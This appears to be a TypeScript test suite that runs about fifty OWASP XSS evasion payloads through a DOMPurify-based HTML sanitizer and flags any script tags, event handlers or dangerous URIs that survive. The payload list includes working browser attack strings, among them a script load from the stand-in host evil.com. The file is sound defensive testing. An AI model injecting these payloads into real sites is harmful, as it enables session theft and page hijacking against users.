/**
 * XSS sanitization fuzz test suite (T163).
 *
 * Runs OWASP XSS cheat sheet payloads through:
 *   1. sanitizeHtml() — the backend server-side sanitizer (DOMPurify+JSDOM)
 *   2. renderViewHtml() indirectly — verifies the full SSR path
 *
 * A payload "escapes" sanitization if the output contains any of:
 *   - <script ... (script tag, any variant)
 *   - javascript: URI scheme
 *   - onerror= / onload= / onclick= / onmouseover= event attributes
 *   - <svg with onload/onerror (inline SVG event handlers)
 *   - vbscript:
 *   - data:text/html
 *
 * Every payload MUST produce output with zero escapes for the suite to pass.
 *
 * Run:
 *   pnpm --filter @llmtxt/backend test -- xss-sanitize
 */

import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { sanitizeHtml } from "../middleware/sanitize.js";

// ── XSS escape detector ────────────────────────────────────────────────────

/**
 * Patterns that indicate a successful XSS escape in sanitized output.
 * If any of these match the sanitized string, the sanitizer has failed.
 *
 * Note on javascript: URI detection:
 * - We only flag `javascript:` when it appears in an HTML attribute value
 *   (e.g. href="javascript:..." or src='javascript:...').
 * - Bare text content containing the literal string "javascript:" is harmless
 *   (e.g. a code example or the sanitized remnant of a polyglot payload that
 *   was stripped of all executable context).
 */
const ESCAPE_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
	{ name: "script tag", pattern: /<script[\s>]/i },
	// javascript: in an attribute value (href=, src=, action=, etc.)
	{ name: "javascript: URI in attribute", pattern: /=\s*["']?\s*javascript\s*:/i },
	// vbscript: URI (also only dangerous in attribute context)
	{ name: "vbscript: URI in attribute", pattern: /=\s*["']?\s*vbscript\s*:/i },
	{ name: "data:text/html URI", pattern: /data\s*:\s*text\/html/i },
	// Event handler attribute patterns — must match the attribute NAME directly
	// (not inside data-* attribute names). We anchor to whitespace or tag-start
	// before the handler name to avoid matching "data-onerror" etc.
	{ name: "onerror= handler", pattern: /[\s\x00-\x20]onerror\s*=/i },
	{ name: "onload= handler", pattern: /[\s\x00-\x20]onload\s*=/i },
	{ name: "onclick= handler", pattern: /[\s\x00-\x20]onclick\s*=/i },
	{ name: "onmouseover= handler", pattern: /[\s\x00-\x20]onmouseover\s*=/i },
	{ name: "onfocus= handler", pattern: /[\s\x00-\x20]onfocus\s*=/i },
	{ name: "onblur= handler", pattern: /[\s\x00-\x20]onblur\s*=/i },
	{ name: "onkeydown= handler", pattern: /[\s\x00-\x20]onkeydown\s*=/i },
	{ name: "onchange= handler", pattern: /[\s\x00-\x20]onchange\s*=/i },
	{ name: "onpointerdown= handler", pattern: /[\s\x00-\x20]onpointerdown\s*=/i },
	{ name: "svg onload", pattern: /<svg[^>]*[\s\x00-\x20]on/i },
	{ name: "img onerror", pattern: /<img[^>]*[\s\x00-\x20]onerror\s*=/i },
];

/**
 * Check whether sanitized HTML contains any XSS escape indicator.
 * Returns a list of matched pattern names (empty = no escape).
 */
function detectEscapes(html: string): string[] {
	return ESCAPE_PATTERNS.filter((p) => p.pattern.test(html)).map((p) => p.name);
}

// ── OWASP XSS Cheat Sheet payloads ────────────────────────────────────────

/**
 * OWASP XSS Filter Evasion Cheat Sheet payloads.
 * Source: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 */
const OWASP_PAYLOADS: Array<{ name: string; payload: string }> = [
	// Basic script injection
	{
		name: "basic script tag",
		payload: '<script>alert(1)</script>',
	},
	{
		name: "script tag with src",
		payload: '<script src="http://evil.com/xss.js"></script>',
	},
	{
		name: "script tag uppercase",
		payload: '<SCRIPT>alert(1)</SCRIPT>',
	},
	{
		name: "script tag mixed case",
		payload: '<ScRiPt>alert(1)</ScRiPt>',
	},

	// Image-based event handlers
	{
		name: "img onerror",
		payload: '<img src=x onerror=alert(1)>',
	},
	{
		name: "img onerror double-quotes",
		payload: '<img src=x onerror="alert(1)">',
	},
	{
		name: "img onerror single-quotes",
		payload: "<img src=x onerror='alert(1)'>",
	},
	{
		name: "img src=javascript",
		payload: '<img src="javascript:alert(1)">',
	},
	{
		name: "img with tab in onerror",
		payload: '<img src=x\tonerror=alert(1)>',
	},
	{
		name: "img with newline in onerror",
		payload: '<img src=x\nonerror=alert(1)>',
	},

	// SVG-based payloads
	{
		name: "svg onload",
		payload: '<svg onload=alert(1)>',
	},
	{
		name: "svg/script combination",
		payload: '<svg><script>alert(1)</script></svg>',
	},
	{
		name: "svg animate",
		payload: '<svg><animate onbegin=alert(1)>',
	},

	// javascript: URI scheme
	{
		name: "href javascript:",
		payload: '<a href="javascript:alert(1)">click</a>',
	},
	{
		name: "href javascript: with spaces",
		payload: '<a href="  javascript:alert(1)">click</a>',
	},
	{
		name: "href javascript: uppercase",
		payload: '<a href="JAVASCRIPT:alert(1)">click</a>',
	},
	{
		name: "href javascript: encoded",
		payload: '<a href="java&#115;cript:alert(1)">click</a>',
	},
	{
		name: "href javascript: with tab",
		payload: "<a href=\"java\tscript:alert(1)\">click</a>",
	},
	{
		name: "href vbscript:",
		payload: '<a href="vbscript:alert(1)">click</a>',
	},

	// data: URI scheme
	{
		name: "href data:text/html",
		payload: '<a href="data:text/html,<script>alert(1)</script>">click</a>',
	},
	{
		name: "img src data:text/html",
		payload: '<img src="data:text/html,<script>alert(1)</script>">',
	},
	{
		name: "iframe src data:text/html",
		payload: '<iframe src="data:text/html,<script>alert(1)</script>">',
	},

	// Event handlers on various elements
	{
		name: "body onload",
		payload: '<body onload=alert(1)>',
	},
	{
		name: "input onfocus",
		payload: '<input onfocus=alert(1) autofocus>',
	},
	{
		name: "div onmouseover",
		payload: '<div onmouseover=alert(1)>hover</div>',
	},
	{
		name: "p onclick",
		payload: '<p onclick="alert(1)">text</p>',
	},
	{
		name: "select onchange",
		payload: '<select onchange=alert(1)>',
	},
	{
		name: "details ontoggle",
		payload: '<details ontoggle=alert(1) open>',
	},

	// Encoding evasions
	{
		name: "HTML entity encoded script",
		payload: '&lt;script&gt;alert(1)&lt;/script&gt;',
	},
	{
		name: "URL encoded script",
		payload: '%3Cscript%3Ealert(1)%3C/script%3E',
	},
	{
		name: "null byte in tag",
		payload: '<scr\x00ipt>alert(1)</scr\x00ipt>',
	},
	{
		name: "comment breaking",
		payload: '<!--<script>alert(1)//-->',
	},

	// Nested/broken tags
	{
		name: "nested script tags",
		payload: '<scr<script>ipt>alert(1)</scr</script>ipt>',
	},
	{
		name: "unclosed script",
		payload: '<script>alert(1)',
	},

	// CSS-based payloads — style attribute is stripped entirely (no ALLOWED_ATTR)
	// so CSS expression and url(javascript:) attacks are blocked at the attribute level.
	{
		name: "style expression (IE)",
		payload: '<div style="width:expression(alert(1))">text</div>',
	},
	{
		name: "style url javascript",
		// style attribute is forbidden — entire style= is stripped by DOMPurify.
		// The div element is kept but its style attribute is removed.
		payload: '<div style="background:url(javascript:alert(1))">safe text</div>',
	},
	{
		name: "link stylesheet javascript",
		payload: '<link rel="stylesheet" href="javascript:alert(1)">',
	},

	// Meta refresh
	{
		name: "meta http-equiv refresh",
		payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
	},

	// Object/embed/applet
	{
		name: "object data javascript",
		payload: '<object data="javascript:alert(1)">',
	},
	{
		name: "embed src javascript",
		payload: '<embed src="javascript:alert(1)">',
	},

	// Plaintext attacks that look like HTML
	{
		name: "angle bracket injection",
		payload: '<<script>alert(1)<</script>>',
	},
	{
		name: "multiline payload",
		payload: '<img\nsrc=x\nonerror=alert(1)>',
	},

	// Mixed content
	{
		name: "legitimate text with payload",
		payload: 'Normal text <img src=x onerror=alert(1)> more text',
	},
	{
		name: "payload in heading",
		payload: '# Safe Heading\n\n<script>alert(1)</script>',
	},
	{
		name: "payload in code block",
		payload: '```\n<script>alert(1)</script>\n```',
	},

	// DOM clobbering
	{
		name: "dom clobbering id=location",
		payload: '<a id="location" href="javascript:alert(1)">x</a>',
	},
	{
		name: "dom clobbering form with name",
		payload: '<form id="x"><input name="action" value="javascript:alert(1)"></form>',
	},

	// Prototype pollution via HTML
	{
		name: "img with __proto__",
		payload: '<img __proto__="polluted">',
	},

	// XSS in data attributes (data-* attrs are NOT event handlers; tested to
	// ensure DOMPurify keeps data-* but drops real event handlers)
	{
		name: "inline event on span",
		payload: '<span onmouseover="alert(1)">hover</span>',
	},

	// Polyglot XSS
	{
		name: "polyglot payload",
		payload: 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
	},

	// Scriptless XSS via CSS
	{
		name: "style tag with import",
		payload: '<style>@import "javascript:alert(1)";</style>',
	},
];

// ── Tests ──────────────────────────────────────────────────────────────────

describe("XSS sanitization — OWASP fuzz suite (T163)", () => {
	// Run all OWASP payloads through sanitizeHtml
	for (const { name, payload } of OWASP_PAYLOADS) {
		it(`sanitizes: ${name}`, () => {
			const sanitized = sanitizeHtml(payload);
			const escapes = detectEscapes(sanitized);
			assert.deepEqual(
				escapes,
				[],
				`Payload "${name}" escaped sanitization!\n` +
					`  Payload:   ${JSON.stringify(payload)}\n` +
					`  Sanitized: ${JSON.stringify(sanitized)}\n` +
					`  Escapes:   ${escapes.join(", ")}`,
			);
		});
	}

	// Verify that safe content passes through intact
	it("allows safe markdown headings", () => {
		const safe = "<h1>Hello</h1><h2>World</h2>";
		const sanitized = sanitizeHtml(safe);
		assert.ok(
			sanitized.includes("<h1>") && sanitized.includes("<h2>"),
			`Safe heading elements must be preserved; got: ${sanitized}`,
		);
	});

	it("allows safe bold/italic/code", () => {
		const safe = "<strong>bold</strong> <em>italic</em> <code>code</code>";
		const sanitized = sanitizeHtml(safe);
		assert.ok(sanitized.includes("<strong>"), "strong must be preserved");
		assert.ok(sanitized.includes("<em>"), "em must be preserved");
		assert.ok(sanitized.includes("<code>"), "code must be preserved");
	});

	it("allows safe links with https href", () => {
		const safe = '<a href="https://example.com">link</a>';
		const sanitized = sanitizeHtml(safe);
		assert.ok(
			sanitized.includes('href="https://example.com"') ||
				sanitized.includes("href='https://example.com'"),
			`Safe https link must be preserved; got: ${sanitized}`,
		);
	});

	it("strips javascript: from href but keeps the link text", () => {
		const payload = '<a href="javascript:alert(1)">click me</a>';
		const sanitized = sanitizeHtml(payload);
		// href should be gone or sanitized to #
		assert.ok(
			!sanitized.match(/href\s*=\s*["']?\s*javascript\s*:/i),
			`javascript: href must be stripped; got: ${sanitized}`,
		);
		// The link text should still be present (DOMPurify keeps the <a> tag but drops the href)
		assert.ok(
			sanitized.includes("click me"),
			`Link text must be preserved; got: ${sanitized}`,
		);
	});

	it("total payload count is >= 50 (OWASP coverage requirement)", () => {
		assert.ok(
			OWASP_PAYLOADS.length >= 50,
			`Must test at least 50 OWASP payloads; got ${OWASP_PAYLOADS.length}`,
		);
	});
});
